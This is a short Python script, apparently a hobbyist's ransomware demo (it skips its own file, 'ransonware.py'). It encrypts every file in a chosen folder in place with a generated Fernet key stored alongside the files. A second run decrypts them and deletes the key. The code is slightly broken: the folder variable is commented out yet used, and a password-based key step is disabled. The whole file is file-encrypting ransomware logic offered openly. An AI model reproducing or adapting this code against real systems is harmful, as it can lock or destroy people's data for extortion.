import os
from cryptography.fernet import Fernet
import base64
import hashlib
from pathlib import Path
from getpass import getpass

password = getpass()

#pasta = "C:\Temp\BACKUP\Pasta"
# endereco = "C:\\Users\\rodol\\Dropbox\\Pasta"

os.chdir(pasta)

keyFile = "thekey.key"
endereco = pasta + "\\"+keyFile

crypto = True

key_file = Path(endereco)
if key_file.exists():
    crypto = False
    

files = []
for file in os.listdir():
    if file == "ransonware.py" or file == "thekey.key" or file == "desktop.ini":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

if crypto:
    key = Fernet.generate_key()
    with open(keyFile,"wb") as thekey:
        thekey.write(key);
else:
    with open(keyFile, "rb") as thekey:
        key = thekey.read()
    # kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), key, 100000)
    # key = base64.urlsafe_b64decode(kdf)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    if crypto:
        contents_cryp = Fernet(key).encrypt(contents)
    else:
        contents_cryp = Fernet(key).decrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_cryp)
        
if crypto:
    print('')
    # with open(keyFile, "rb") as thefile:
    #     contents = thefile.read()
    # kdf = hashlib.pbkdf2_hmac('sha256', password.encode(), contents, 100000)
    # key = base64.urlsafe_b64encode(kdf)
    # with open(keyFile,"wb") as thekey:
    #     thekey.write(key);
else:
    os.remove(endereco)